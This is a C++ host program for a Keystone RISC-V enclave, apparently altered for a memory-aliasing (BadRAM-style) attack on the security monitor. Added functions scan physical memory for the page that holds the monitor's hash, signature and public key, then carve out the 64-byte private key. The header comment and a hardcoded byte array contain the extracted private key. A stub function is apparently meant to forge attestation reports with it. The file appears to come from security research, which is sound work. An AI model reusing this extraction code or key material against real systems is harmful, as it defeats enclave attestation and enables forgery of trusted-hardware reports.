//******************************************************************************
// Copyright (c) 2018, The Regents of the University of California (Regents).
// All Rights Reserved. See LICENSE for license details.
// [SM] Initializing ... hart [2]
//[SM] Keystone security monitor has been initialized!
// 6b82e5cc4833c9160f5ae6ec1167d3ed4726ed8eeee772f24919a84744f76acc0abc736ec2ae4b36ae2efa5b0b22b719e9b4a4414e69846b770c239eb9ea22b2
// Booting from Security Monitor
//============ Device PUBKEY =============
// ffd4aa0f838517019688a5baf31f7c6f
// 17dd6425462bdcd74aa850cb4c0b2769
//=================================
//============ SM PUBKEY =============
// 8ad2711d2e2ec1ddbf0b2d65ec21c9c9
// d18373add80af0f6d6ba8696e23b83b1
//=================================
//=========== SM PRIVKEY =============
// 1a5d
// 86a0
// ddf7
// 031b
// 9123d74014b2215c
// 88eb7b6e11c3e96b2d9e6207723b6891
// 7134ea06aea5a3c4317a3de11189a802
// 518fccb1b5b97bb3ea26388aa4df
// df4d
//
//=================================
//=========== SM SIGNATURE ===========
// cab26344bfc0c444fb8e9962c66c106e
// ce74b16a76576953ab554e728a5bcda0
// 92c1afe25936cc154b42bd41b19ae281
// ba2c10dbf27407bf263211c95f660
//=================================
//=========== SM HASH ===========
// cce5826b16c93348ece65a0fedd36711
// 8eed2647f272e7ee47a81949cc6af744
// 6e73bc0a364baec25bfa2eae19b7220b
// 41a4b4e96b84694e9e230c77b222eab9
//=================================
//------------------------------------------------------------------------------

#include "host.h"

#include <cstring>
#include <getopt.h>
#include <memory>
#include <stddef.h>
#include <stdlib.h>

#include <cerrno>
#include <cstdio>
#include <functional>
#include <iostream>
#include <stdexcept>
#include <string>

#include "edge/edge_common.h"
#include "host/keystone.h"
#include "verifier/report.h"
// TODO: add paths to cmakelists
extern "C" {
#include "/home/alouka/Documents/repos/badram-riscv/alias-reversing/modules/read_alias/include/readalias.h"
#include "/home/alouka/Documents/repos/badram-riscv/alias-reversing/modules/read_alias/readalias.c"
}

#define OCALL_PRINT_BUFFER 1
#define OCALL_PRINT_VALUE 2
#define OCALL_COPY_REPORT 3
#define OCALL_GET_STRING 4

void SharedBuffer::set_ok() {
  edge_call_->return_data.call_status = CALL_STATUS_OK;
}

void SharedBuffer::set_bad_offset() {
  edge_call_->return_data.call_status = CALL_STATUS_BAD_OFFSET;
}
void SharedBuffer::set_bad_ptr() {
  edge_call_->return_data.call_status = CALL_STATUS_BAD_PTR;
}

int SharedBuffer::get_ptr_from_offset(edge_data_offset offset, uintptr_t *ptr) {
  /* Validate that _shared_start+offset is sane */
  if (offset > UINTPTR_MAX - buffer_ || offset > buffer_len_) {
    return -1;
  }

  /* ptr looks valid, create it */
  *ptr = buffer_ + offset;
  return 0;
}

int SharedBuffer::args_ptr(uintptr_t *ptr, size_t *size) {
  *size = edge_call_->call_arg_size;
  return get_ptr_from_offset(edge_call_->call_arg_offset, ptr);
}

std::optional<std::pair<uintptr_t, size_t>>
SharedBuffer::get_call_args_ptr_or_set_bad_offset() {
  uintptr_t call_args;
  size_t arg_len;
  if (args_ptr(&call_args, &arg_len) != 0) {
    set_bad_offset();
    return std::nullopt;
  }
  return std::pair{call_args, arg_len};
}

std::optional<char *> SharedBuffer::get_c_string_or_set_bad_offset() {
  auto v = get_call_args_ptr_or_set_bad_offset();
  return v.has_value() ? std::optional{(char *)v.value().first} : std::nullopt;
}

std::optional<unsigned long>
SharedBuffer::get_unsigned_long_or_set_bad_offset() {
  auto v = get_call_args_ptr_or_set_bad_offset();
  return v.has_value() ? std::optional{*(unsigned long *)v.value().first}
                       : std::nullopt;
}

// NOTE: this function returns the report
// structure after reading from memory
std::optional<Report> SharedBuffer::get_report_or_set_bad_offset() {
  auto v = get_call_args_ptr_or_set_bad_offset();
  if (!v.has_value())
    return std::nullopt;

  // before setting the report we can get the bytes from the shared buffer
  //===========================
  //
  // get address to report bytes
  byte *report_bytes = (byte *)v.value().first;
  // create byte array size of report
  byte report[sizeof(struct report_t)];
  // copy report bytes
  std::memcpy(&report, report_bytes, sizeof(struct report_t));

  printf("Printing Report bytes\n");
  __print_bytes((const byte *)report, sizeof(report_t));
  struct report_t *report_s = (report_t *)report;
  printf("SM public key:\n");
  __print_bytes(report_s->sm.public_key, PUBLIC_KEY_SIZE);
  printf("Dev public key:\n");
  __print_bytes(report_s->dev_public_key, PUBLIC_KEY_SIZE);
  // private key size is 64 bytes including public key
  byte sm_private_key[64] = {
      0xa0, 0x86, 0x5d, 0x1a, 0x1b, 0x03, 0xf7, 0xdd, 0x40, 0xd7, 0x23,
      0x91, 0x5c, 0x21, 0xb2, 0x14, 0x6e, 0x7b, 0xeb, 0x88, 0x6b, 0xe9,
      0xc3, 0x11, 0x07, 0x62, 0x9e, 0x2d, 0x91, 0x68, 0x3b, 0x72, 0x06,
      0xea, 0x34, 0x71, 0xc4, 0xa3, 0xa5, 0xae, 0xe1, 0x3d, 0x7a, 0x31,
      0x02, 0xa8, 0x89, 0x11, 0xb1, 0xcc, 0x8f, 0x51, 0xb3, 0x7b, 0xb9,
      0xb5, 0x8a, 0x38, 0x26, 0xea, 0x4d, 0xdf, 0xdf, 0xa4};
  // NOTE: to find the private key we need to run the __dump_memory fn
  //__dump_memory(report_s, private_key);
  //===========================
  //

  Report ret;
  ret.fromBytes((byte *)v.value().first);
  __modify_report(&ret, sm_private_key);

  return ret;
}
void __modify_report(Report *rep, byte sm_private_key[64]) {

  // TODO:
}
uintptr_t SharedBuffer::data_ptr() {
  return (uintptr_t)edge_call_ + sizeof(struct edge_call);
}

int SharedBuffer::validate_ptr(uintptr_t ptr) {
  /* Validate that ptr starts in range */
  if (ptr > buffer_ + buffer_len_ || ptr < buffer_) {
    return 1;
  }
  return 0;
}

int SharedBuffer::get_offset_from_ptr(uintptr_t ptr, edge_data_offset *offset) {
  int valid = validate_ptr(ptr);
  if (valid != 0)
    return valid;

  /* ptr looks valid, create it */
  *offset = ptr - buffer_;
  return 0;
}

int SharedBuffer::setup_ret(void *ptr, size_t size) {
  edge_call_->return_data.call_ret_size = size;
  return get_offset_from_ptr((uintptr_t)ptr,
                             &edge_call_->return_data.call_ret_offset);
}

void SharedBuffer::setup_ret_or_bad_ptr(unsigned long ret_val) {
  // Assuming we are done with the data section for args, use as
  // return region.
  //
  // TODO safety check?
  uintptr_t data_section = data_ptr();

  memcpy((void *)data_section, &ret_val, sizeof(unsigned long));

  if (setup_ret((void *)data_section, sizeof(unsigned long))) {
    set_bad_ptr();
  } else {
    set_ok();
  }
}

int SharedBuffer::setup_wrapped_ret(void *ptr, size_t size) {
  struct edge_data data_wrapper;
  data_wrapper.size = size;
  get_offset_from_ptr(buffer_ + sizeof(struct edge_call) +
                          sizeof(struct edge_data),
                      &data_wrapper.offset);

  memcpy(
      (void *)(buffer_ + sizeof(struct edge_call) + sizeof(struct edge_data)),
      ptr, size);

  memcpy((void *)(buffer_ + sizeof(struct edge_call)), &data_wrapper,
         sizeof(struct edge_data));

  edge_call_->return_data.call_ret_size = sizeof(struct edge_data);
  return get_offset_from_ptr(buffer_ + sizeof(struct edge_call),
                             &edge_call_->return_data.call_ret_offset);
}

void SharedBuffer::setup_wrapped_ret_or_bad_ptr(const std::string &ret_val) {
  if (setup_wrapped_ret((void *)ret_val.c_str(), ret_val.length() + 1)) {
    set_bad_ptr();
  } else {
    set_ok();
  }
  return;
}

void Host::print_buffer_wrapper(RunData &run_data) {
  SharedBuffer &shared_buffer = run_data.shared_buffer;

  auto t = shared_buffer.get_c_string_or_set_bad_offset();
  if (t.has_value()) {
    printf("Enclave said: %s", t.value());
    auto ret_val = strlen(t.value());
    shared_buffer.setup_ret_or_bad_ptr(ret_val);
  }
}

bool __check_pattern(char buf[0x1000], const byte *pattern,
                     size_t pattern_len) {
  for (int i = 0; i <= (0x1000 - pattern_len); i++) {
    if (memcmp(&buf[i], pattern, pattern_len) == 0)
      return true;
  }
  return false;
}

static void __print_page(char buf[0x1000], uint64_t addr) {
  printf("Page at [%llx]: \n", addr);
  for (int val = 0; val < 0x1000; val++)
    printf("%02x ", buf[val]);
  printf("\n");
}
void __print_bytes(const byte *buf, size_t buf_len) {
  for (size_t i = 0; i < buf_len; i += 1) {
    printf("%02x ", *(buf + i));
  }
  printf("\n");
}

static void __dump_memory(struct report_t *report_s, byte private_key[64]) {

  byte *sm_hash = report_s->sm.hash;
  byte *sm_signature = report_s->sm.signature;
  byte *sm_pub_key = report_s->sm.public_key;

  // Just dump pages:
  char buf[4096] = {0};
  page_stats_t stats;

  printf("====================DEBUG=================\n");
  printf("SM Hash:\t");
  __print_bytes(sm_hash, MDSIZE);
  printf("SM Sig:\t");
  __print_bytes(sm_signature, SIGNATURE_SIZE);
  printf("SM Pub key:\t");
  __print_bytes(sm_pub_key, PUBLIC_KEY_SIZE);
  // reading x801ff000 crashes the machine
  //  printf("Leak the page based on the pinned address:\n");
  //  /*copy content of the page to buf using physical address*/
  //  if (memcpy_frompa(buf, 0x801ff000, 4096, &stats, true) != 0) {
  //    printf("PAddr reading Error\n");
  //    return;
  //  }
  //  __print_page(buf, 0x801ff000);
  printf("====================DEBUG=================\n");

  for (uint64_t paddr_candidate = 0x200000000; paddr_candidate < 0x1000000000;
       paddr_candidate += 0x1000) {

    /*copy content of the page to buf using physical address*/
    if (memcpy_frompa(buf, paddr_candidate, 4096, &stats, true) != 0) {
      printf("PAddr reading Error\n");
      return;
    }
    // NOTE:just dump pages and then check results to fix code below
    // if (__check_pattern(buf, sm_pub_key, PUBLIC_KEY_SIZE))
    //  __print_page(buf, paddr_candidate);

    // if 3 SM data exist in a page (hash, signature, pub key)
    // and no enclave data exists we
    // have the page that also contains private key
    if (__check_pattern(buf, sm_hash, MDSIZE) &&
        __check_pattern(buf, sm_signature, SIGNATURE_SIZE) &&
        __check_pattern(buf, sm_pub_key, PUBLIC_KEY_SIZE)) {
      __print_page(buf, paddr_candidate);
      if (__extract_private_key(buf, sm_pub_key, PUBLIC_KEY_SIZE,
                                private_key)) {
        printf("Private Key Found:\n");
        __print_bytes(private_key, 64);
        return;
      } else {
        printf("Private Key Not Found:\n");
        return;
      }
    }
  }
}

static bool __extract_private_key(const char buf[0x1000], byte *pub_key,
                                  size_t pubkey_size, byte *private_key) {
  printf("Extracting private key...\n");
  for (int i = 0; i <= (0x1000 - pubkey_size); i++) {
    if (memcmp(&buf[i], pub_key, pubkey_size) == 0) {
      // found the public key in page at buf+i we need PRIVATE_KEY_SIZE
      // bytes in the private key variable
      // private key size is 64 bytes
      // and ends where the public key starts
      memcpy(private_key, ((buf + i) - (64)), 64);
      // private key size is 64 bytes including public key
      return true;
    }
  }
  return false;
}

void Host::print_value_wrapper(RunData &run_data) {
  SharedBuffer &shared_buffer = run_data.shared_buffer;

  auto t = shared_buffer.get_unsigned_long_or_set_bad_offset();
  if (t.has_value()) {
    printf("Enclave said value: %u\n", t.value());
    shared_buffer.set_ok();
  }
  return;
}

void Host::copy_report_wrapper(RunData &run_data) {
  SharedBuffer &shared_buffer = run_data.shared_buffer;

  auto t = shared_buffer.get_report_or_set_bad_offset();
  if (t.has_value()) {
    run_data.report = std::make_unique<Report>(std::move(t.value()));
    shared_buffer.set_ok();
  }
  return;
}

void Host::get_host_string_wrapper(RunData &run_data) {
  SharedBuffer &shared_buffer = run_data.shared_buffer;

  shared_buffer.setup_wrapped_ret_or_bad_ptr(run_data.nonce);
  return;
}

void Host::dispatch_ocall(RunData &run_data) {
  struct edge_call *edge_call =
      (struct edge_call *)run_data.shared_buffer.ptr();
  switch (edge_call->call_id) {
  case OCALL_PRINT_BUFFER:
    print_buffer_wrapper(run_data);
    break;
  case OCALL_PRINT_VALUE:
    print_value_wrapper(run_data);
    break;
  case OCALL_COPY_REPORT:
    copy_report_wrapper(run_data);
    break;
  case OCALL_GET_STRING:
    get_host_string_wrapper(run_data);
    break;
  }
  return;
}

Report Host::run(const std::string &nonce) {
  open_kmod();
  Keystone::Enclave enclave;
  enclave.init(eapp_file_.c_str(), rt_file_.c_str(), ld_file_.c_str(), params_);

  RunData run_data{
      SharedBuffer{enclave.getSharedBuffer(), enclave.getSharedBufferSize()},
      nonce, nullptr};

  enclave.registerOcallDispatch([&run_data](void *buffer) {
    assert(buffer == (void *)run_data.shared_buffer.ptr());
    dispatch_ocall(run_data);
  });

  uintptr_t encl_ret;
  enclave.run(&encl_ret);

  return *run_data.report;
}
